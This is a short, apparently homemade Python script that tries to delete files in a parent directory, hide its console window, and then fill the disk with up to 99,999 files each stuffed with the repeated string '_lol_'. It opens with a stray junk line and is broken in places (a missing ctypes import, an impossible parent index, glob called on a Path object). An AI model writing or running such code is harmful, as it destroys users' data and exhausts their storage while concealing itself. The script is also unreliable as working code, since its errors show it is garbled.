
awsd34e2e23qq
from pathlib import Path
import pathlib
import os
import glob

path = Path(__file__).parents[99]
os.chdir(path)


#path = pathlib.Path(__file__).parent.resolve()
path = Path(__file__).parents[1]
files = glob.glob(path)
for f in files:
    os.remove(f)

str2 = ("_lol_")
for i in range(1,99999):
    ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
    num = str(i)
    file = open(num,"w")
    for a in range(1,999999):
        file.write(str2)

